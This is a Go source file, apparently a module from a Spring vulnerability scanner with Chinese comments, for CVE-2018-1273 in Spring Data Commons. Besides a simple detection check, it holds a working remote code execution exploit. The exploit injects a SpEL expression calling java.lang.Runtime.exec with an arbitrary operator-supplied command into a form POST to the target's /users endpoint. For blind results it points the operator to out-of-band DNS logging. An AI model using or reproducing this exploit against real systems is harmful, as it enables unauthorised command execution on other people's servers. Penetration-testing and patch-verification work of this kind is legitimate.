package vulns

import (
	"context"
	"fmt"
	"net/http"
	"strings"

	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2018-1273 Spring Data Commons SpEL 注入 RCE。
type cve20181273 struct{}

func init() { Register(&cve20181273{}) }

func (c *cve20181273) Info() model.Info {
	return model.Info{
		ID:         "CVE-2018-1273",
		Name:       "Spring Data Commons SpEL RCE",
		Type:       "RCE",
		Severity:   "critical",
		Affected:   "Spring Data Commons 1.13.x-1.13.10 / 2.0.x-2.0.5",
		Reference:  "https://spring.io/security/cve-2018-1273",
		HasExploit: true,
		ArgHint:    "要执行的命令（无回显，请配合 dnslog/OOB 平台确认）",
	}
}

func (c *cve20181273) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
	for _, path := range []string{"users", "users?page=0&size=5"} {
		resp, body, err := do(ctx, t, http.MethodGet, path, headers, "")
		if err != nil {
			return nil, err
		}
		if resp.StatusCode == http.StatusOK && strings.Contains(string(body), "Users") {
			v.Vulnerable = true
			v.Evidence = "users 端点可达且返回 Users 元数据"
			v.Detail = "无回显，请通过 dnslog/OOB 平台确认命令执行结果"
			return v, nil
		}
	}
	return v, nil
}

func (c *cve20181273) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	escaped := strings.ReplaceAll(arg, `"`, `\"`)
	payload := fmt.Sprintf(`username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("%s")]=chybeta&password=chybeta&repeatedPassword=chybeta`, escaped)

	headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
	if _, _, err := do(ctx, t, http.MethodPost, "users", headers, payload); err != nil {
		return "", "", err
	}
	return "", "无回显漏洞：payload 已发出，请通过 dnslog/OOB 平台验证执行结果", nil
}
